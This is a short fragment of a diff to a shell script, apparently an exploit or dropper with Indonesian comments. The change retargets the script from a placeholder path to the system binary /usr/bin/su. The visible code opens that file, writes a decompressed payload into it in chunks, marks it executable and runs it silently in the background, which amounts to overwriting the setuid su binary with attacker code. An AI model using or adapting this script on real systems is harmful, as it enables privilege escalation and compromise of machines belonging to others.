@@ -40,7 +40,7 @@ send_chunk() {
 # Main function
 main() {
     # Open file target
-    exec 3< "/usr/bin/bawak"
+    exec 3< "/usr/bin/su"
     file_fd=3
     
     # Decompress payload
@@ -60,8 +60,8 @@ main() {
     done
     
     # Eksekusi binary
-    chmod +x "/usr/bin/bawak" 2>/dev/null
-    "/usr/bin/bawak" 2>/dev/null &
+    chmod +x "/usr/bin/su" 2>/dev/null
+    "/usr/bin/su" 2>/dev/null &
     
     # Cleanup
     exec 3<&-
